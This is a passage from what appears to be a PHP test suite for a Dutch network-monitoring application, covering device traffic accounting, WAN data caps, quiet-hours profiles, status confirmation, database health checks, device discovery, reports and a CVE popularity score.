    'popup van een check: hoe vaak gecheckt, storingen en hersteltijd over 30 dagen, melden na N, details van de container');
// 1.186.0: verkeer per apparaat: verschil van de tellers per uur en per dag, teller terug = opnieuw verbonden, ongewoon veel en 's nachts
q("DELETE FROM net_devices WHERE mac IN ('ee:ee:ee:00:01:86', 'ee:ee:ee:00:01:87')");
q("INSERT INTO net_devices (mac, ip, kind, status, info, first_seen, last_seen) VALUES ('ee:ee:ee:00:01:86', '10.186.0.1', 'camera', 'known', '{}', NOW(), NOW()), ('ee:ee:ee:00:01:87', '10.186.0.2', 'iot', 'known', '{}', NOW(), NOW())");
$trA = (int) q("SELECT id FROM net_devices WHERE mac = 'ee:ee:ee:00:01:86'")->fetchColumn();
$trB = (int) q("SELECT id FROM net_devices WHERE mac = 'ee:ee:ee:00:01:87'")->fetchColumn();
$trT0 = strtotime(date('Y-m-d 10:02:00'));
$trSeq = [[1000, 500, 0, 0], [6000, 2500, 300, 100], [800, 200, 400, 150]];   // A: +5000/+2000, dan teller terug (opnieuw verbonden)
foreach ($trSeq as $i => [$aRx, $aTx, $bRx, $bTx]) {
    NetTraffic::$fetch = fn() => ['EE:EE:EE:00:01:86' => ['rx' => $aRx, 'tx' => $aTx], 'ee:ee:ee:00:01:87' => ['rx' => $bRx, 'tx' => $bTx]];
    NetTraffic::poll($trT0 + $i * 300);
}
NetTraffic::$fetch = null;
$trH = q('SELECT device_id, rx, tx FROM net_traffic WHERE device_id IN (?, ?) ORDER BY device_id', [$trA, $trB])->fetchAll(PDO::FETCH_UNIQUE);
$trD = q('SELECT rx, tx FROM net_traffic_day WHERE device_id = ?', [$trA])->fetch();
// ongewoon: 10 dagen 50 MB upload, gisteren 1 GB; 's nachts 100 MB terwijl het 's nachts stil is
$yday = date('Y-m-d', strtotime('yesterday'));
for ($i = 2; $i <= 11; $i++) {
    q('INSERT INTO net_traffic_day (device_id, day, rx, tx) VALUES (?, CURDATE() - INTERVAL ? DAY, 20000000, 50000000), (?, CURDATE() - INTERVAL ? DAY, 1000, 1000)', [$trA, $i, $trB, $i]);
}
q('INSERT INTO net_traffic_day (device_id, day, rx, tx) VALUES (?, ?, 30000000, 1000000000), (?, ?, 100000000, 1000)', [$trA, $yday, $trB, $yday]);
q('INSERT INTO net_traffic (device_id, hour, rx, tx) VALUES (?, ?, 100000000, 0)', [$trB, $yday . ' 03:00:00']);
q('DELETE FROM net_events WHERE device_id IN (?, ?)', [$trA, $trB]);
$trN = NetTraffic::daily($yday);
$trEv = q('SELECT device_id, kind, detail FROM net_events WHERE device_id IN (?, ?) ORDER BY id', [$trA, $trB])->fetchAll();
ok((int) $trH[$trA]['rx'] === 5800 && (int) $trH[$trA]['tx'] === 2200 && (int) $trH[$trB]['rx'] === 400 && (int) $trH[$trB]['tx'] === 150
    && (int) $trD['rx'] === 5800 && NetTraffic::delta(100, 50, 300) === 50 && NetTraffic::delta(0, PHP_INT_MAX >> 1, 300) === 0
    && $trN === 2 && $trEv[0]['kind'] === 'traffic' && (int) $trEv[0]['device_id'] === $trA && json_decode($trEv[0]['detail'], true)['dir'] === 'up'
    && $trEv[1]['kind'] === 'traffic_night' && (int) $trEv[1]['device_id'] === $trB && NetTraffic::human(1500000) === '1,5 MB',
    'verkeer: verschil per uur en dag, teller terug telt vanaf nul, onmogelijke sprong genegeerd, ongewoon veel upload en verkeer \'s nachts');
// 1.187.0: check Verkeer, internetlijn per maand met datalimiet (som van de apparaten zonder gateway), rapport
NetTraffic::$fetch = fn() => [];
q('INSERT INTO net_counters (device_id, rx, tx, rate_rx, rate_tx, at) VALUES (?, 0, 0, 2500000, 500000, ?) ON DUPLICATE KEY UPDATE rate_rx = 2500000, rate_tx = 500000, at = VALUES(at)', [$trA, time()]);
q('INSERT INTO net_traffic_day (device_id, day, rx, tx) VALUES (?, CURDATE(), 3000000000, 1500000000) ON DUPLICATE KEY UPDATE rx = 3000000000, tx = 1500000000', [$trA]);
$tcHost = ['address' => '10.186.0.1'];
$tcRate = NetTraffic::check(['target' => '', 'metric' => 'rate', 'warn_threshold' => 10, 'crit_threshold' => 50], $tcHost);
$tcUp = NetTraffic::check(['target' => 'ee:ee:ee:00:01:86', 'metric' => 'up_day', 'warn_threshold' => 1, 'crit_threshold' => 5], $tcHost);
$tcNone = NetTraffic::check(['target' => '10.9.9.9', 'metric' => 'rate', 'warn_threshold' => 1, 'crit_threshold' => 2], $tcHost);
q('DELETE FROM net_wan_day');
NetTraffic::wanUpdate();
$wmUsed = NetTraffic::wanMonth()['rx'] + NetTraffic::wanMonth()['tx'];
save_setting('net_wan_cap_gb', (string) round($wmUsed / 0.9 / 1e9, 3));   // 90% gebruikt
save_setting('net_wan_cap_alert', '');
$wm = NetTraffic::wanMonth();
NetTraffic::capCheck();
$capAlert = json_decode((string) setting('net_wan_cap_alert', ''), true) ?: [];
$rep = NetTraffic::report(date('Y-m-d'), date('Y-m-d'));
save_setting('net_wan_cap_gb', '');
NetTraffic::$fetch = null;
ok($tcRate['status'] === STATUS_WARN && abs((float) $tcRate['value'] - 24.0) < 0.01 && $tcUp['status'] === STATUS_WARN && abs((float) $tcUp['value'] - 1.5) < 0.01
    && $tcNone['status'] === STATUS_UNKNOWN && $wm['src'] === 'devices' && $wm['rx'] >= 3000000000 && $wm['cap'] > $wmUsed
    && ($capAlert[80] ?? '') === date('Y-m') && ($capAlert[100] ?? '') === '' && $rep['top'][0]['rx'] >= 3000000000,
    'check verkeer: snelheid en upload vandaag met drempels, onbekend apparaat; internetlijn uit de som van de apparaten, 80% van de datalimiet gemeld; top in het rapport');
// 1.189.0: stille-urenprofielen: check → server → eigen groep → soort → algemeen, nooit stil, critical door, periode, Nu stil
Quiet::migrate();
$qAll = ['from' => '00:00', 'to' => '00:00', 'days' => [1, 2, 3, 4, 5, 6, 7]];   // de hele dag, elke dag
$qNight = Quiet::saveProfile(null, ['name' => 'Test nacht', 'windows' => [$qAll]]);
$qCrit = Quiet::saveProfile(null, ['name' => 'Test crit door', 'windows' => [$qAll], 'crit' => 1]);
$qPast = Quiet::saveProfile(null, ['name' => 'Test vakantie', 'windows' => [], 'date_from' => '2020-01-01', 'date_to' => '2020-01-07']);
$qOldGlobal = setting('quiet_global', '');
save_setting('quiet_global', (string) $qNight);
Quiet::reset();
q("INSERT INTO hosts (name, address, mode, enabled, grp, kind) VALUES ('Q-host', '10.189.0.1', 'remote', 1, 'Q-groep', 'camera')");
$qH = (int) db()->lastInsertId();
$qC = Templates::insertCheck($qH, ['type' => 'ping', 'target' => '', 'name' => 'Q-ping']);
$qCheck = fn() => q('SELECT c.*, c.host_id AS hid FROM checks c WHERE c.id = ?', [$qC])->fetch();
$qs = [];
Quiet::reset(); $qs[] = Quiet::forCheck($qCheck())['src'];                          // algemeen
Quiet::setGroup('kind:camera', 'never'); $qs[] = Quiet::forCheck($qCheck())['src'];  // soort apparaat
Quiet::setGroup('grp:Q-groep', 'p:' . $qCrit); $qs[] = Quiet::forCheck($qCheck())['src'];   // eigen groep gaat voor de soort
q('UPDATE hosts SET quiet = ? WHERE id = ?', ['p:' . $qPast, $qH]); Quiet::reset(); $qs[] = Quiet::forCheck($qCheck())['src'];
$qPastOff = Quiet::until(Quiet::forCheck($qCheck())) === null;                       // periode voorbij: niet stil
q('UPDATE checks SET quiet = ? WHERE id = ?', [json_encode(['mode' => 'never']), $qC]); Quiet::reset(); $qs[] = Quiet::forCheck($qCheck())['src'];
$qNever = Quiet::holds($qCheck(), STATUS_WARN);
q('UPDATE checks SET quiet = NULL WHERE id = ?', [$qC]);
q('UPDATE hosts SET quiet = NULL WHERE id = ?', [$qH]); Quiet::reset();
$qHoldWarn = Quiet::holds($qCheck(), STATUS_WARN);
$qHoldCrit = Quiet::holds($qCheck(), STATUS_CRIT);                                  // eigen groep: critical komt door
Quiet::setNow('check', $qC, time() + 3600);
$qNow = Quiet::forCheck($qCheck());
$qNowCrit = Quiet::holds($qCheck(), STATUS_CRIT);                                   // Nu stil: ook critical stil
Quiet::deleteProfile($qCrit);
$qAfterDel = (string) q("SELECT COUNT(*) FROM quiet_groups WHERE gkey = 'grp:Q-groep'")->fetchColumn();
ok($qs === ['global', 'kind', 'grp', 'host', 'check'] && $qPastOff && !$qNever && $qHoldWarn && !$qHoldCrit
    && $qNow['src'] === 'check_now' && $qNowCrit && $qAfterDel === '0'
    && NotifyRules::cleanQuietOwn(['mode' => 'profile', 'id' => $qNight]) === ['mode' => 'profile', 'id' => $qNight] && NotifyRules::cleanQuietOwn(['mode' => 'profile', 'id' => 999999]) === null,
    'stille uren: algemeen, soort, eigen groep (gaat voor), server, check; periode voorbij = niet stil; nooit stil; critical door; Nu stil gaat voor alles; profiel weg = volgt weer');
q('DELETE FROM checks WHERE id = ?', [$qC]);
q('DELETE FROM hosts WHERE id = ?', [$qH]);
Quiet::setGroup('kind:camera', null);
Quiet::deleteProfile($qNight);
Quiet::deleteProfile($qPast);
save_setting('quiet_global', $qOldGlobal);
Quiet::reset();
// migratie van vóór 1.189.0: algemene stille uren worden "Standaard" (★), eigen vensters van een check een eigen profiel
$mgOld = [setting('notify_quiet', ''), setting('quiet_migrated', ''), setting('quiet_global', '')];
save_setting('notify_quiet', json_encode(['on' => true, 'windows' => [['from' => '23:00', 'to' => '07:00', 'days' => [1, 2, 3, 4, 5, 6, 7]]]]));
save_setting('quiet_migrated', '');
q("INSERT INTO hosts (name, address, mode, enabled) VALUES ('Mg-host', '10.189.0.2', 'remote', 1)");
$mgH = (int) db()->lastInsertId();
$mgC = Templates::insertCheck($mgH, ['type' => 'ping', 'target' => '', 'name' => 'Mg-ping', 'quiet' => json_encode(['mode' => 'own', 'windows' => [['from' => '08:00', 'to' => '17:00', 'days' => [1, 2, 3, 4, 5]]]])]);
Quiet::reset();
Quiet::migrate();
$mgQ = json_decode((string) q('SELECT quiet FROM checks WHERE id = ?', [$mgC])->fetchColumn(), true);
$mgG = Quiet::profiles()[(int) setting('quiet_global', '')] ?? null;
$mgP = Quiet::profiles()[(int) ($mgQ['id'] ?? 0)] ?? null;
ok(($mgQ['mode'] ?? '') === 'profile' && $mgG && $mgG['name'] === 'Standaard' && $mgG['windows'][0]['from'] === '23:00' && $mgP && $mgP['windows'][0]['from'] === '08:00'
    && str_contains($mgP['name'], 'Mg-ping'), 'stille uren na de update: algemeen wordt profiel Standaard (★), eigen vensters van een check een eigen profiel');
foreach ([(int) setting('quiet_global', ''), (int) ($mgQ['id'] ?? 0)] as $mgId) {
    Quiet::deleteProfile($mgId);
}
q('DELETE FROM checks WHERE id = ?', [$mgC]);
q('DELETE FROM hosts WHERE id = ?', [$mgH]);
save_setting('notify_quiet', $mgOld[0]);
save_setting('quiet_migrated', $mgOld[1] ?: '1');
save_setting('quiet_global', $mgOld[2]);
Quiet::reset();
// 1.188.0: andere bronnen: agent (netwerkkaart), SNMP (switchpoort met één MAC) en voorrang (UniFi > SNMP > agent)
q('DELETE FROM net_counters WHERE device_id IN (?, ?)', [$trA, $trB]);
q('DELETE FROM net_traffic WHERE device_id IN (?, ?)', [$trA, $trB]);
$t0 = time() - 2000;
$f1 = NetTraffic::feed($trB, 'agent', 1000, 500, $t0);                 // eerste stand
$f2 = NetTraffic::feed($trB, 'agent', 4000, 1500, $t0 + 300);          // +3000/+1000
$f3 = NetTraffic::feed($trB, 'unifi', 90000, 9000, $t0 + 400);         // UniFi neemt over: nog geen verschil
$f4 = NetTraffic::feed($trB, 'agent', 5000, 2000, $t0 + 500);          // UniFi is vers: agent telt niet
$f5 = NetTraffic::feed($trB, 'unifi', 91000, 9500, $t0 + 700);         // +1000/+500
$rate = (int) q('SELECT rate_rx FROM net_counters WHERE device_id = ?', [$trB])->fetchColumn();
q('INSERT INTO hosts (name, address, mode, enabled, agent_ips) VALUES (\'Agentserver\', \'10.186.0.1\', \'agent\', 1, \'\')');
$agHost = q('SELECT * FROM hosts WHERE id = ?', [(int) db()->lastInsertId()])->fetch();
NetTraffic::fromAgent($agHost, ['nic' => ['rx' => 100, 'tx' => 100]], $t0 + 100);
NetTraffic::fromAgent($agHost, ['nic' => ['rx' => 2100, 'tx' => 600]], $t0 + 400);
$agTr = q('SELECT SUM(rx) rx, SUM(tx) tx FROM net_traffic WHERE device_id = ?', [$trA])->fetch();
q('DELETE FROM hosts WHERE id = ?', [$agHost['id']]);
$ports = NetTraffic::snmpPorts(
    ['1.238.238.238.0.1.134' => '3', '1.170.187.204.0.0.1' => '5', '1.170.187.204.0.0.2' => '5'],   // poort 3: één MAC, poort 5: twee (uplink)
    [], ['3' => '103', '5' => '105'], ['103' => '7000', '105' => '1'], ['103' => '9000', '105' => '1']);
ok($f1 === null && $f2 === [3000, 1000] && $f3 === null && $f4 === null && $f5 === [1000, 500] && $rate === 3
    && (int) $agTr['rx'] === 2000 && (int) $agTr['tx'] === 500
    && $ports === ['ee:ee:ee:00:01:86' => [9000, 7000]],
    'bronnen: agent telt, UniFi neemt over zonder sprong en gaat voor, snelheid uit het verschil; agent via het adres van de server; SNMP alleen poorten met één MAC (in = upload)');
q('DELETE FROM net_wan_day');
q('DELETE FROM net_events WHERE device_id IN (?, ?)', [$trA, $trB]);
q('DELETE FROM net_devices WHERE id IN (?, ?)', [$trA, $trB]);
NetTraffic::purge();
// 1.185.0: status bevestigen: pas na N controles achter elkaar warning/critical, herstel apart, leeg = meteen
save_setting('confirm_fails', '');
save_setting('confirm_ok', '');
$cfBase = ['status' => STATUS_OK, 'last_checked' => now(), 'pend_status' => null, 'pend_count' => 0, 'confirm_fails' => null, 'confirm_ok' => null];
$cfOff = Monitor::confirmStatus($cfBase, STATUS_CRIT);
save_setting('confirm_fails', '3');
$cf1 = Monitor::confirmStatus($cfBase, STATUS_WARN);
$cf2 = Monitor::confirmStatus(['pend_status' => STATUS_WARN, 'pend_count' => 1] + $cfBase, STATUS_CRIT);   // warning en critical tellen samen
$cf3 = Monitor::confirmStatus(['pend_status' => STATUS_CRIT, 'pend_count' => 2] + $cfBase, STATUS_CRIT);
$cfReset = Monitor::confirmStatus(['pend_status' => STATUS_CRIT, 'pend_count' => 2] + $cfBase, STATUS_OK);   // tussendoor goed: telling weg
$cfNew = Monitor::confirmStatus(['last_checked' => null] + $cfBase, STATUS_CRIT);   // nieuwe check: meteen
$cfOwn = Monitor::confirmStatus(['confirm_fails' => 1] + $cfBase, STATUS_CRIT);   // eigen 1 = meteen, ook al staat algemeen 3
$cfRecNow = Monitor::confirmStatus(['status' => STATUS_CRIT] + $cfBase, STATUS_OK);
save_setting('confirm_ok', '2');
$cfRec1 = Monitor::confirmStatus(['status' => STATUS_CRIT] + $cfBase, STATUS_OK);
$cfRec2 = Monitor::confirmStatus(['status' => STATUS_CRIT, 'pend_status' => STATUS_OK, 'pend_count' => 1] + $cfBase, STATUS_OK);
// 1.191.2: nog nooit echt gemeten (alleen onbekend): de eerste echte meting geldt meteen; wel ooit gemeten: gewoon bevestigen
q("INSERT INTO hosts (name, address, mode) VALUES ('ci-cf-onb', '192.0.2.77', 'remote')");
$cfH = (int) db()->lastInsertId();
q("INSERT INTO checks (host_id, type, target, name, status) VALUES (?, 'ping', '192.0.2.77', 'onb', 3)", [$cfH]);
$cfC = (int) db()->lastInsertId();
q('INSERT INTO results (check_id, status, value) VALUES (?, 3, NULL)', [$cfC]);
$cfFirst = Monitor::confirmStatus(['id' => $cfC, 'status' => STATUS_UNKNOWN] + $cfBase, STATUS_OK);
q('INSERT INTO results (check_id, status, value) VALUES (?, 0, 1)', [$cfC]);
$cfAgain = Monitor::confirmStatus(['id' => $cfC, 'status' => STATUS_UNKNOWN] + $cfBase, STATUS_OK);
q('DELETE FROM hosts WHERE id = ?', [$cfH]);
save_setting('confirm_fails', '');
save_setting('confirm_ok', '');
ok($cfOff === [STATUS_CRIT, null, 0] && $cf1 === [STATUS_OK, STATUS_WARN, 1] && $cf2 === [STATUS_OK, STATUS_CRIT, 2] && $cf3 === [STATUS_CRIT, null, 0]
    && $cfReset === [STATUS_OK, null, 0] && $cfNew === [STATUS_CRIT, null, 0] && $cfOwn === [STATUS_CRIT, null, 0]
    && $cfRecNow === [STATUS_OK, null, 0] && $cfRec1 === [STATUS_CRIT, STATUS_OK, 1] && $cfRec2 === [STATUS_OK, null, 0]
    && $cfFirst === [STATUS_OK, null, 0] && $cfAgain === [STATUS_UNKNOWN, STATUS_OK, 1],
    'status bevestigen: leeg = meteen, na 3 mislukte (warning en critical samen) critical, tussendoor goed = opnieuw, nieuwe check meteen, eigen waarde gaat voor, herstel na 2, eerste echte meting na alleen onbekend meteen');
// 1.193.0: bevestigen per soort check (check → soort → algemeen), en waar staat de check (van meting tot melding)
save_setting('confirm_fails', '3');
save_setting('confirm_types', json_encode(['disk' => ['f' => '1', 'o' => ''], 'xx bad' => ['f' => '5']]));
$ctDisk = Monitor::confirmNeeded(['type' => 'disk'], false);
$ctPing = Monitor::confirmNeeded(['type' => 'ping'], false);
$ctOwn = Monitor::confirmNeeded(['type' => 'disk', 'confirm_fails' => 4], false);
$ctBad = array_key_exists('xx bad', Monitor::confirmTypes());
save_setting('notify_fails', '1');
save_setting('confirm_fast', '1');
q("INSERT INTO hosts (name, address, mode) VALUES ('ci-flow', '192.0.2.93', 'remote')");
$flH = (int) db()->lastInsertId();
q("INSERT INTO checks (host_id, type, target, name, interval_sec, status, pend_status, pend_count, status_since, last_checked) VALUES (?, 'ping', '192.0.2.93', 'flow', 60, 0, 2, 1, NOW(), NOW())", [$flH]);
$flC = q('SELECT * FROM checks WHERE id = ?', [(int) db()->lastInsertId()])->fetch();
q('INSERT INTO results (check_id, status, value) VALUES (?, 2, NULL)', [$flC['id']]);
$fl = Monitor::flow($flC);
q('DELETE FROM hosts WHERE id = ?', [$flH]);
save_setting('confirm_fails', '');
save_setting('confirm_types', '');
ok($ctDisk === 1 && $ctPing === 3 && $ctOwn === 4 && !$ctBad && $fl['raw'] === 2 && $fl['pend'] === 2 && $fl['need'] === 3 && $fl['pend_n'] === 1
    && ($fl['eta'] ?? -1) >= 99 && ($fl['eta'] ?? 0) <= 101,
    'status bevestigen per soort: disk 1, ping de algemene 3, eigen waarde gaat voor, ongeldige soort weg; popup: ruwe meting critical, bevestigen 1/3, melding over ±100 s (40 s sneller bevestigen + meldregel na 1 min)');

// 1.200.0: databasecheck via de agent: een meting per verbinding, overzicht en losse waarden, MariaDB en PostgreSQL
q("INSERT INTO hosts (name, address, mode, agent_seen, enabled) VALUES ('ci-db', '10.0.0.9', 'agent', NOW(), 1)");
$dbh = q("SELECT * FROM hosts WHERE name = 'ci-db'")->fetch();
$dbCheck = static function (?string $metric, array $o, ?float $w = null, ?float $c = null) use ($dbh): array {
    q('INSERT INTO checks (host_id, type, metric, name, target, options, warn_threshold, crit_threshold, interval_sec, enabled) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 60, 1)',
        [$dbh['id'], 'mysql', $metric, 'db ' . ($metric ?? 'overzicht'), '', json_encode(['via' => 'agent'] + $o), $w, $c]);
    return q('SELECT * FROM checks WHERE id = ?', [(int) db()->lastInsertId()])->fetch();
};
$myO = $dbCheck(null, ['engine' => 'mysql', 'longq' => 60], 500, 2000);
$myR = $dbCheck('repl', ['engine' => 'mysql'], 60, 300);
$pgO = $dbCheck(null, ['engine' => 'pgsql'], 500, 2000);
$pgW = $dbCheck('wrap', ['engine' => 'pgsql'], 50, 75);
$myKv = ['Uptime' => '5000', 'Threads_connected' => '10', 'Threads_running' => '2', 'Questions' => '1000', 'v:max_connections' => '100', 'v:version' => '10.11.6-MariaDB',
    'repl:Slave_IO_Running' => 'No', 'repl:Slave_SQL_Running' => 'Yes', 'repl:Last_IO_Error' => 'error connecting to master', 'longq:1' => '120|app|shop|' . base64_encode('SELECT * FROM orders'),
    'size:shop' => '2000000000', 'wsrep_cluster_status' => 'Disconnected', 'wsrep_cluster_size' => '0'];
$pgKv = ['version' => '16.4', 'uptime' => '900', 'conn' => '5', 'max_conn' => '100', 'active' => '1', 'xact' => '10', 'blks_hit' => '990', 'blks_read' => '10',
    'wrap_age' => (string) (int) (0.6 * 2147483648), 'idle_tx' => '0', 'recovery' => '0', 'replicas' => '0', 'size:app' => '500000'];
Db::fromAgent($dbh, ['db' => [Db::key(Db::opts($myO)) => ['ok' => 1, 'ms' => 12, 'kv' => $myKv, 'at' => time()],
    Db::key(Db::opts($pgO)) => ['ok' => 1, 'ms' => 30, 'kv' => $pgKv, 'at' => time()]]], now());
$r1 = Checks::run($myO, $dbh);
$r2 = Checks::run($myR, $dbh);
$r3 = Checks::run($pgO, $dbh);
$r4 = Checks::run($pgW, $dbh);
ok($r1['status'] === STATUS_CRIT && str_contains($r1['message'], 'Replicatie staat stil') && str_contains($r1['message'], 'Query loopt al') && !str_contains($r1['message'], 'Galera')
    && $r2['status'] === STATUS_CRIT && $r3['status'] === STATUS_WARN && str_contains($r3['message'], 'wraparound') && $r4['status'] === STATUS_WARN && abs((float) $r4['value'] - 60.0) < 0.1,
    'Databasecheck: replicatie stil = CRITICAL, lange query, geen Galera zonder cluster, wraparound 60% = WARNING (overzicht en losse waarde)');
$lines = Db::agentLines((int) $dbh['id'], false);
ok(count($lines) === 4 && count(array_unique(array_map(static fn($l) => explode("\t", $l)[8], $lines))) === 2 && !str_contains(implode("\n", $lines), base64_encode('x')),
    'Databasecheck: één verbinding per database voor de agent (checks delen de meting), wachtwoord alleen versleuteld');
$st = Db::state($myO);
ok(isset($st['prev']['c_queries'], $st['m']['m']['repl']) && (new ReflectionMethod('CheckInfo', 'detail'))->invoke(null, $myO)['kind'] === 'db',
    'Databasecheck: tussenstand voor de volgende keer en het beeld voor de popup');

// 1.197.0: netwerk in het kort voor de Home Assistant-kaart (GET /v1.php/network), met en zonder IDS
$nw = Mds::network(false);
$nwi = Mds::network(true);
ok(in_array($nw['status'], [0, 1, 2], true) && is_array($nw['problems']) && is_array($nw['paths']) && $nw['ids'] === null && is_array($nwi['ids'])
    && array_key_exists('internet', $nw) && array_key_exists('month', $nw) && array_key_exists('devices', $nw),
    'HA-netwerkkaart: oordeel met redenen, internet, maand, apparaten en paden; IDS alleen met het recht IDS lezen');
ok(is_file(__DIR__ . '/../../public/assets/rzmon-network-card.js') && str_contains((string) file_get_contents(__DIR__ . '/../../public/assets/rzmon-network-card.js'), "customElements.define('rzmon-network-card'"),
    'HA-netwerkkaart: het kaartbestand bestaat en definieert rzmon-network-card');
// 1.198.0: met servers erbij (?servers=1): per server status, CPU/RAM/disk en problemen; zonder: geen servers
$nws = Mds::network(false, [['id' => 1, 'name' => 'srv', 'enabled' => true, 'mode' => 'agent', 'status' => 2, 'in_maintenance' => false, 'agent_seen' => date('c'),
    'checks' => [['type' => 'cpu', 'name' => 'CPU', 'enabled' => true, 'info' => false, 'in_maintenance' => false, 'status' => 2, 'value' => 97.0]]]]);
ok($nw['servers'] === null && is_array($nws['servers']) && $nws['servers'][0]['cpu'] === 97.0 && $nws['servers'][0]['problems'] === 1 && $nws['status'] === 2
    && in_array('srv · CPU', array_column($nws['problems'], 'text'), true),
    'HA-netwerkkaart: servers met CPU/RAM/disk en problemen, en ze tellen mee in het oordeel');

// 1.194.0: mDS (Mobile device summary): beveiliging en netwerk in één keer, ook als een module uit staat
$mds = Mds::data();
ok(is_array($mds['sec']) && isset($mds['sec']['inc'], $mds['sec']['blk_today'], $mds['sec']['logins']) && array_key_exists('vulns', $mds['sec'])
    && is_array($mds['net']) && array_key_exists('wan', $mds['net']) && is_array($mds['net']['top']),
    'mDS: beveiliging (incidenten, blokkades, logins, kwetsbaarheden, datalekken) en netwerk (internet, maand, nieuwe apparaten, top 3) zonder fouten');

// 1.183.0: Netwerk → Ontdekken: poorten, domeinen (eerst leren), aanwezigheid, voorstellen en met één klik in RzSense
q("DELETE FROM net_devices WHERE mac = 'ee:ee:ee:00:01:83'");
q("INSERT INTO net_devices (mac, ip, random_mac, vendor, kind, status, ports, info, first_seen, last_seen) VALUES ('ee:ee:ee:00:01:83', '10.183.0.9', 0, 'Reolink', 'camera', 'new', '[80,554]', '{}', NOW(), NOW())");
$ndId = (int) db()->lastInsertId();
NetDiscover::ports($ndId, null, [80, 554]);
NetDiscover::ports($ndId, [80, 554], [23, 80]);
$ndInfo = [];
NetDiscover::domains($ndId, $ndInfo, ['a.reolink.com' => 5], time() - 10 * 86400);
NetDiscover::domains($ndId, $ndInfo, ['api.reolink.com' => 3, 'x.tuyacn.com' => 9, 'cam.local' => 1]);
NetDiscover::presence([$ndId], strtotime('today 03:30'));
NetDiscover::presence([$ndId], strtotime('today 05:10'));
$ndEv = array_values(array_filter(NetDiscover::events(1), fn($e) => $e['device'] === $ndId));
$ndKinds = array_column($ndEv, 'kind');
$ndPres = NetDiscover::presenceGrid(1)[$ndId][date('Y-m-d')] ?? 0;
$ndDev = array_values(array_filter(NetScan::list(), fn($d) => (int) $d['id'] === $ndId))[0];
$ndSug = NetDiscover::suggest($ndDev);
$ndHost = NetDiscover::adopt($ndId, ['ping', 'p23x', 'p80'], 'Testcamera', 'test');
$ndChecks = q('SELECT type, target FROM checks WHERE host_id = ? ORDER BY id', [$ndHost])->fetchAll();
ok(in_array('ports_new', $ndKinds, true) && in_array('ports_gone', $ndKinds, true) && in_array('domains', $ndKinds, true) && count($ndEv) === 3
    && $ndEv[0]['kind'] === 'domains' && $ndEv[0]['detail']['domains'] === ['tuyacn.com'] && NetDiscover::baseDomain('a.b.voorbeeld.co.uk') === 'voorbeeld.co.uk'
    && $ndPres === ((1 << 3) | (1 << 5)) && array_column($ndSug, 'key') === ['ping', 'p80', 'p554']
    && count($ndChecks) === 2 && $ndChecks[1]['target'] === 'http://10.183.0.9/' && q('SELECT kind FROM hosts WHERE id = ?', [$ndHost])->fetchColumn() === 'camera'
    && q('SELECT status FROM net_devices WHERE id = ?', [$ndId])->fetchColumn() === 'known',
    'ontdekken: nieuwe en gesloten poort, nieuw domein pas na het leren (lokaal genegeerd), uren gezien, voorstel per poort, met één klik in RzSense');
q('DELETE FROM checks WHERE host_id = ?', [$ndHost]);
q('DELETE FROM hosts WHERE id = ?', [$ndHost]);
q('DELETE FROM net_events WHERE device_id = ?', [$ndId]);
q('DELETE FROM net_presence WHERE device_id = ?', [$ndId]);
q('DELETE FROM net_devices WHERE id = ?', [$ndId]);
// 1.182.0: functietabel: status uit de instellingen, elke rij compleet, FEATURES.md loopt niet achter
$ftSt = [Features::status('', []), Features::status('x_on', ['x_on' => '1']), Features::status('x_on', ['x_on' => '0']), Features::status('x_on|x_key', ['x_on' => '1', 'x_key' => '']), Features::status('backup_freq', ['backup_freq' => 'off'])];
$ftRows = Features::rows();
$ftOk = count($ftRows) === count(Features::LIST);
foreach (Features::LIST as $r) $ftOk = $ftOk && isset(Features::GROUPS[$r[0]]) && count($r[1]) === 2 && count($r[2]) === 2 && preg_match('/^\d+\.\d+\.\d+$/', $r[3]);
exec(escapeshellarg(PHP_BINARY) . ' ' . escapeshellarg(__DIR__ . '/../../tools/features-table.php') . ' --check 2>&1', $ftOut, $ftRc);
ok($ftSt === ['always', 'on', 'off', 'unset', 'off'] && $ftOk && $ftRc === 0, 'functietabel: altijd/aan/uit/niet ingesteld, elke rij heeft een groep, NL+EN en een versie, FEATURES.md is bijgewerkt');
// 1.180.0: Rapporten: de oude instellingen worden overgenomen, wanneer een rapport aan de beurt is, één keer per periode, de inhoud
save_setting('reports', '');
save_setting('ids_weekly', 'both');
save_setting('ids_weekly_day', '3');
save_setting('ids_weekly_time', '07:30');
save_setting('report_monthly', '1');
$rpCfg = Reports::cfg();
$rpWed = strtotime('2026-11-04 08:00');   // een woensdag
$rpSaved = Reports::save(['vulns' => ['on' => 1, 'freq' => 'week', 'day' => 9, 'time' => '25:00', 'email' => 1], 'all' => ['on' => 1, 'day' => 40, 'parts' => ['vulns', 'onzin']]]);
$rpDoc = Reports::build('vulns');
$rpAll = Reports::build('all');
ok($rpCfg['ids_week']['on'] && $rpCfg['ids_week']['day'] === 3 && $rpCfg['ids_week']['time'] === '07:30' && $rpCfg['ids_week']['email'] && $rpCfg['ids_week']['push'] && $rpCfg['month']['on']
    && Reports::due('ids_week', $rpCfg['ids_week'], $rpWed) === '2026-W45' && Reports::due('ids_week', $rpCfg['ids_week'], strtotime('2026-11-04 07:00')) === null
    && Reports::due('ids_week', $rpCfg['ids_week'], strtotime('2026-11-05 08:00')) === null
    && Reports::due('month', ['on' => true, 'freq' => 'month', 'day' => 1, 'time' => '07:00'], $rpWed) === '2026-11'
    && $rpSaved['vulns']['day'] === 7 && $rpSaved['vulns']['time'] === '08:00' && $rpSaved['all']['day'] === 28 && $rpSaved['all']['parts'] === ['vulns']
    && setting('ids_weekly') === 'both' && str_contains($rpDoc['html'], '<!doctype html>') && $rpDoc['text'] !== '' && str_contains($rpAll['html'], '<section>'),
    'rapporten: oude instellingen overgenomen, aan de beurt op de dag na de tijd (één keer per week/maand), grenzen bewaakt, HTML en tekst');
save_setting('reports', '');
// 1.179.0: rugbaarheid: score uit de bronnen, SSVC lezen, map in Vulnrichment, oordeel van de AI, alleen veilige Mastodon-adressen
q("INSERT IGNORE INTO vuln_cve (cve, severity, kev, epss) VALUES ('CVE-2099-7001', 4, 1, 0.81)");
$bz = CveBuzz::update('CVE-2099-7001', ['gh' => 31, 'hn' => 40, 'hn7' => 12, 'md7' => 25, 'edb' => true, 'nuclei' => true, 'ssvc' => ['e' => 'active', 'a' => 'yes', 't' => 'total']]);
$bzQuiet = CveBuzz::score(['gh' => 0, 'hn' => 0, 'hn7' => 0, 'md7' => 0], null);
